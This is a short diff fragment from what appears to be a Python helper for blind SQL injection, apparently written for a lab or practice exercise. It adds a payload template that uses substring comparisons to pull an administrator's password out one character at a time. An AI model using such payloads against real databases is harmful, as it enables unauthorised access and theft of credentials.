@@ -31,6 +31,9 @@ def format_length_query(inner_query, length):
 """
 select password from users where username = 'administsrator'
 inner query
+
+
+return f"xyz' or substring(({inner_query}), {index},1) = '{char}'-- "
 """    
 
 """
